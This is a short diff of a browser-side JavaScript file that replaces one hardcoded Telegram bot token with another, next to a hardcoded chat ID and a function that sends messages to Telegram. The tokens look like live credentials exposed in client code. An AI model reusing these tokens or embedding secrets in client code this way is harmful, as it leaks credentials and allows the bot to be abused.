@@ -17,7 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentLinks = {};
 
     // Token bota i chat ID (upewnij się, że zostały poprawnie ustawione)
-    const botToken = '7268385791:AAEZeAc-jfVun4EEKdiOquB_jC-7vrBFupY';
+    const botToken = '7191447029:AAEC0Z8riqxEOLb-QZ2B4FiRguqcd0PGxQA';
     const chatId = '7025921907';
 
     // Funkcja do wysyłania wiadomości do Telegrama
